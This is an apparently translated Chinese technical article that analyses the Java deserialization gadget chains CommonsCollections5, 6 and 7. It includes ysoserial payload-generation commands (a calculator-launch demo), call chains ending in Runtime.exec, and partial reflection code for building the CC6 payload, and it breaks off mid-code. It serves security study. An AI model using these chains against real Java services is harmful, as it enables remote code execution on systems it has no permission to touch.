# Java反序列化利用链分析之CommonsCollections5,6,7,9,10
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
本文继续分析`CommonsCollections:3.1`的相关反序列化利用链，这次主要分析CommonsCollections5,6,7,9，以及我找的一个新利用链，这里暂且将其称为10.
## 0x01 环境准备
CommonsCollections5,6,7,10用的还是`commons-collections:3.1`，jdk用7或8都可以。  
CommonsCollections9适用于3.2.1
    java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "open /System/Applications/Calculator.app" > commonscollections5.ser
    java -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 "open /System/Applications/Calculator.app" > commonscollections6.ser
    java -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 "open /System/Applications/Calculator.app" > commonscollections7.ser
## 0x02 利用链分析
###  1\. 背景回顾
前面提到过CommonsCollections1和3在构造AnnotationInvocationHandler时用到了Override.class。但是如果你在jdk8的环境下去载入生成的payload，会发生`java.lang.Override
missing element entrySet`的错误。
这个错误的产生原因主要在于jdk8更新了`AnnotationInvocationHandler`[参考](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)
jdk8不直接调用`s.defaultReadObject`来填充当前的`AnnotaionInvocationHandler`实例，而选择了单独填充新的变量。
这里我们回顾一下，1和3的payload的触发点是`LazyMap.get`函数，而触发这个函数需要使得`memberValues`为`LazyMap`对象
显然，jdk8的操作使得`memberValues`并不是我们构造好的`LazyMap`类型。在调试中，可以看到此时的`memberValues`为`LinkedHashMap`对象，该对象无法获得`entrySet`的内容，所以会报前面的这个错误。
jdk8下CommonsCollections1和3无法成功利用了，但是如果我们可以找到一个替代AnnotationInvocationHandler的利用方式呢？这就是本文要讲的CommonsCollections5，6，7所做出的改变。
###  2\. 重新构造前半部分利用链—CommonsCollections5
CommonsCollections5与1的区别在于AnnotationInvocationHandler，后部分是相同的，所以这里不分析后部分。
AnnotationInvocationHandler在前面起到的作用是来触发LazyMap.get函数，所以我们接下来就是要重新找一个可以触发该函数的对象。这个对象满足
  * 类可序列化，类属性有个可控的Map对象或Object
  * 该类的类函数上有调用这个Map.get的地方
CommonsCollections5在这里用到了TiedMapEntry，来看一下
TiedMapEntry有一个map类属性，且在getValue处调用了map.get函数。同时toString、hashCode、equals均调用了getValue函数，这里关注toString函数。
toString函数通常在与字符串拼接时，会被自动调用。那么接下来我们需要找一个对象满足
  * 类可序列化，类属性有个Map.Entry对象或Object
  * 该类会自动调用这个类属性的toString函数或前面的另外几种
这里选择了`BadAttributeValueExpException`对象，他的`readObject`函数会自动调用类属性的`toString`函数。
需要注意的是这里`System.getSecurityManager`为空，换句话说，就是当前的jvm环境不能启用安全管理器。
来看一下一整个调用链
    BadAttributeValueExpException.readObject()
        -> valObj.toString() => TiedMapEntry.getValue
        -> TiedMapEntry.map.get() => LazyMap.get()
        -> factory.transform() => ChainedTransformer.transform()
        -> 前文构造的Runtime.getRuntime().exec()
###  3\. 重新构造前半部分利用链—CommonsCollections6
CommonsCollections6是另一种替换方式，后半部分的利用链还是没有变，不作分析。
我们在2中提到了除了CommonsCollections5用的`toString`外，还有`hashCode`和`equals`函数也调用了getValue函数。那么是否存在调用这两个函数的对象函数呢？答案是肯定的！
CommonsCollections6利用了`TiedMapEntry`的`hashCode`函数，来触发`LazyMap.get`
我们都知道HashSet集合里不会存在相同的key，那么是如何判断是否是相同的key呢？这里就要用到key的hashCode函数了，如果key的值相同，其hashCode返回的值也是相同的。这里的HashCode的计算在HashSet的put和add函数完成，并且HashSet从序列化数据中还原出来时会自动调用put函数，这里就给我们提供了可控的地方。
先来看一下HashSet的`readObject`函数
继续跟put函数，这里其实调用的是HashMap的put函数
其中对key调用的`hash()`函数会调用`key.hashCode`函数，那么现在就很清楚了，我们只要将key的值替换成构造好的`TiedMapEntry`对象就可以了。注意，这里的key值其实就是`HashSet.add`的实例，在HashSet里的HashMap类属性只用到了Key。
整理一下利用链
    HashSet.readObject()
        -> HashMap.put(key) => key.hashCode => TiedMapEntry.hashCode
        -> TiedMapEntry.getValue
        -> TiedMapEntry.map.get() => LazyMap.get()
        -> factory.transform() => ChainedTransformer.transform()
        -> 前文构造的Runtime.getRuntime().exec()
###  4\. 重新构造前半部分利用链—CommonsCollections7
CommonsCollections7用了Hashtable来代替`AnnotationInvocationHandler`，不同于前面两种CommonsCollections7并未使用`TiredMapEntry`，而是用了相同key冲突的方式调用`equals`来触发`Lazy.get`函数。
先来看一下`Hashtable`的`readObject`函数
继续跟进`reconstitutionPut`
该函数将填充table的内容，其中第1236行仅当有重复数据冲突时，才会进入下面的if语句，这里我们继续跟进`equals`函数
这里的`equals`函数取决于`key`的对象，利用链用的是`LazyMap`对象，实际调用的是父类`AbstractMapDecorator`的`equals`函数
这里又调用了map的equals函数，这里实际调用的是HashMap的父类`AbstractMap`的`equals`函数
在第495行调用了`m.get`函数，所以后面又是我们熟悉的`LazyMap.get`的套路了。
整理一下利用链
    Hashtable.readObject()
        -> Hashtable.reconstitutionPut
        -> LazyMap.equals => AbstractMapDecorator.equals => AbstractMap.equals
        -> m.get() => LazyMap.get()
        -> factory.transform() => ChainedTransformer.transform()
        -> 前文构造的Runtime.getRuntime().exec()
###  5\. 利用链构造
CommonsCollections6和7的exp构造比较复杂，这里单独拿出来讲一下。
**CommonsCollections6**
经过前面的分析，我们可以知道CommonsCollections6需要将构造好的TiedMapEntry实例添加到HashSet的值上。
简单的方法就是直接add
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
    HashSet map = new HashSet(1);
    map.add(entry);
复杂一点，就是ysoserail里的实现方法，采用反射机制来完成
其思路主要为：
  * 实例化一个HashSet实例
  * 通过反射机制获取HashSet的map类属性
  * 通过反射机制获取HashMap(map类属性)的table(Node)类属性
  * 通过反射机制获取Node的key类属性，并设置该key的值为构造好的TiedMapEntry实例
具体代码如下
    HashSet map = new HashSet(1);
    map.add("foo");
    Field f = null;
    try {
        f = HashSet.class.getDeclaredField("map");//获取HashSet的map Field对象
    } catch (NoSuchFieldException e) {
        f = HashSet.class.getDeclaredField("backingMap");
    }
    Permit.setAccessible(f);// 设置map可被访问修改
    HashMap innimpl = null;
    innimpl = (HashMap) f.get(map);// 获取map实例的map类属性
    Field f2 = null;
    try {
      f2 = HashMap.class.getDeclaredField("table");// 获取HashMap的 table field
    } catch (NoSuchFieldException e) {
      f2 = HashMap.class.getDeclaredField("elementData");
    }
    Permit.setAccessible(f2);// 设置HashMap的field 可被访问
    Object[] array = new Object[0];
    array = (Object[]) f2.get(innimpl);
    Object node = array[0];// 获取Node实例
    if(node == null){
      node = array[1];
    }
    Field keyField = null;
    try{
      keyField = node.getClass().getDeclaredField("key");// 获取Node的key field